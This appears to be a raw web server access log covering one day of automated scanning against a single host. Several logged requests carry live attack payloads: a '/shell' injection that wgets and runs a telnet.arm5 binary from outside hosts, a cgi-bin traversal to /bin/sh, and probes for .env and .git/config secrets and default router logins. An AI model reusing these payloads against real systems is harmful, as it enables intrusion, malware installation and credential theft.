8.219.8.46 - - [05/Feb/2025:00:11:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "curl/7.64.1"
205.210.31.248 - - [05/Feb/2025:05:12:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
102.212.40.177 - - [05/Feb/2025:05:49:52 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 302 350 "-" "-"
195.211.191.166 - - [05/Feb/2025:05:51:36 +0000] "GET /.env HTTP/1.1" 302 387 "-" "python-requests/2.26.0"
195.211.191.166 - - [05/Feb/2025:05:51:36 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.26.0"
195.211.191.166 - - [05/Feb/2025:05:51:36 +0000] "POST / HTTP/1.1" 200 944 "-" "python-requests/2.26.0"
35.222.217.222 - - [05/Feb/2025:06:09:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.241.65.218/selfreps/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5" 400 527 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:14:13 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:14:13 +0000] "GET / HTTP/1.1" 200 1742 "http://35.243.94.80:80/cgi-bin/luci/;stok=/locale" "-"
185.196.220.253 - - [05/Feb/2025:06:14:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.93 - - [05/Feb/2025:06:16:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:06:16:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
52.189.75.15 - - [05/Feb/2025:06:19:15 +0000] "MGLNDD_35.243.94.80_80\n" 400 527 "-" "-"
172.206.142.52 - - [05/Feb/2025:06:20:16 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
46.19.138.234 - - [05/Feb/2025:06:22:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.43 - - [05/Feb/2025:06:24:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.197.8 - - [05/Feb/2025:06:41:38 +0000] "\x16\x03\x01" 400 527 "-" "-"
206.189.34.180 - - [05/Feb/2025:06:54:42 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
206.189.34.180 - - [05/Feb/2025:06:54:43 +0000] "GET / HTTP/1.1" 200 1742 "http://35.243.94.80:80/favicon.ico" "Go-http-client/1.1"
179.43.191.146 - - [05/Feb/2025:06:55:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [05/Feb/2025:07:08:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:07:08:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
35.195.29.134 - - [05/Feb/2025:07:19:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
111.21.192.221 - - [05/Feb/2025:07:21:06 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
205.210.31.148 - - [05/Feb/2025:07:38:00 +0000] "\x16\x03\x01" 400 527 "-" "-"
205.210.31.148 - - [05/Feb/2025:07:38:01 +0000] "\x16\x03\x01" 400 527 "-" "-"
46.19.143.26 - - [05/Feb/2025:08:31:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
8.152.208.190 - - [05/Feb/2025:08:39:15 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 45.90.162.234/wdjkalwww/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5" 400 527 "-" "-"
59.11.199.186 - - [05/Feb/2025:08:45:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [05/Feb/2025:08:46:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:08:46:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
128.199.196.44 - - [05/Feb/2025:09:04:33 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
205.210.31.5 - - [05/Feb/2025:09:13:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
152.32.128.85 - - [05/Feb/2025:09:20:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "curl/7.29.0"
152.32.128.85 - - [05/Feb/2025:09:20:38 +0000] "\x16\x03\x01" 400 527 "-" "-"
152.32.128.85 - - [05/Feb/2025:09:20:38 +0000] "t3 12.1.2\n" 400 527 "-" "-"
165.154.118.9 - - [05/Feb/2025:09:21:12 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/549.50 (KHTML, like Gecko) Chrome/86.0.2908 Safari/537.36"
165.154.118.9 - - [05/Feb/2025:09:21:12 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
165.154.118.9 - - [05/Feb/2025:09:21:12 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80/favicon.ico" "Go-http-client/1.1"
165.154.118.9 - - [05/Feb/2025:09:21:12 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Go-http-client/1.1"
165.154.118.9 - - [05/Feb/2025:09:21:12 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Go-http-client/1.1"
165.154.118.9 - - [05/Feb/2025:09:21:13 +0000] "GET /sitemap.xml HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
165.154.118.9 - - [05/Feb/2025:09:21:13 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
165.154.118.9 - - [05/Feb/2025:09:21:13 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80/sitemap.xml" "Go-http-client/1.1"
165.154.118.9 - - [05/Feb/2025:09:21:13 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80/robots.txt" "Go-http-client/1.1"
45.144.212.139 - - [05/Feb/2025:09:24:01 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16"
8.219.110.243 - - [05/Feb/2025:09:26:31 +0000] "-" 408 0 "-" "-"
8.219.110.243 - - [05/Feb/2025:09:26:47 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.241.65.218/selfreps/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5" 400 527 "-" "-"
78.153.140.93 - - [05/Feb/2025:09:52:23 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:09:52:24 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.79.181.104 - - [05/Feb/2025:09:54:20 +0000] "\x16\x03\x01\x01\n" 400 527 "-" "-"
45.79.181.104 - - [05/Feb/2025:09:54:21 +0000] "\x16\x03\x01\x01\n" 400 527 "-" "-"
45.156.129.131 - - [05/Feb/2025:09:56:54 +0000] "GET /api/session/properties HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.129.131 - - [05/Feb/2025:09:56:54 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/api/session/properties" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
4.151.38.212 - - [05/Feb/2025:10:03:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
128.199.210.238 - - [05/Feb/2025:10:26:10 +0000] "\x16\x03\x01\x01\x02\x01" 400 527 "-" "-"
128.199.210.238 - - [05/Feb/2025:10:26:10 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
128.199.179.71 - - [05/Feb/2025:10:35:46 +0000] "\x16\x03\x01\x01\x02\x01" 400 527 "-" "-"
128.199.179.71 - - [05/Feb/2025:10:35:46 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
82.29.72.168 - - [05/Feb/2025:10:41:07 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
95.214.55.43 - - [05/Feb/2025:10:47:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.115.34 - - [05/Feb/2025:10:51:01 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.19.143.26 - - [05/Feb/2025:10:52:42 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
46.19.143.26 - - [05/Feb/2025:10:52:43 +0000] "GET / HTTP/1.1" 200 1742 "http://35.243.94.80:80/cgi-bin/luci/;stok=/locale" "-"
138.68.253.41 - - [05/Feb/2025:10:58:17 +0000] "POST /wsman HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
138.68.253.41 - - [05/Feb/2025:10:58:17 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/wsman" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:18 +0000] "GET /auth.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:18 +0000] "GET /auth1.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:18 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:18 +0000] "GET /sslvpnLogin.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:18 +0000] "GET /api/sonicos/auth HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:18 +0000] "GET /api/sonicos/tfa HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:19 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/auth1.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:19 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/auth.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:19 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/sslvpnLogin.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:19 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/api/sonicos/auth" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
147.182.134.104 - - [05/Feb/2025:10:58:19 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/api/sonicos/tfa" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:10:58:20 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:10:58:20 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:10:58:20 +0000] "GET / HTTP/1.1" 200 889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
206.189.164.156 - - [05/Feb/2025:10:58:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
143.110.137.225 - - [05/Feb/2025:10:58:22 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:11:02:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:11:02:00 +0000] "GET /js/brand.js HTTP/1.1" 200 569 "http://35.243.94.80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:11:02:00 +0000] "GET /js/login.js HTTP/1.1" 200 921 "http://35.243.94.80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:11:02:00 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 564 "http://35.243.94.80/js/brand.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.215 - - [05/Feb/2025:11:02:00 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1345 "http://35.243.94.80/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
80.82.77.202 - - [05/Feb/2025:11:08:58 +0000] "\x16\x03\x02\x01o\x01" 400 527 "-" "-"
139.177.202.162 - - [05/Feb/2025:11:15:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
139.177.202.162 - - [05/Feb/2025:11:15:37 +0000] "Gh0st\xad" 400 527 "-" "-"
139.177.202.162 - - [05/Feb/2025:11:15:40 +0000] "HELP" 400 527 "-" "-"
139.177.202.162 - - [05/Feb/2025:11:15:40 +0000] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 527 "-" "-"
139.177.202.162 - - [05/Feb/2025:11:15:42 +0000] "\x16\x03\x01" 400 527 "-" "-"
45.33.33.230 - - [05/Feb/2025:11:15:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
139.177.202.162 - - [05/Feb/2025:11:15:44 +0000] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xff\xd9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 527 "-" "-"
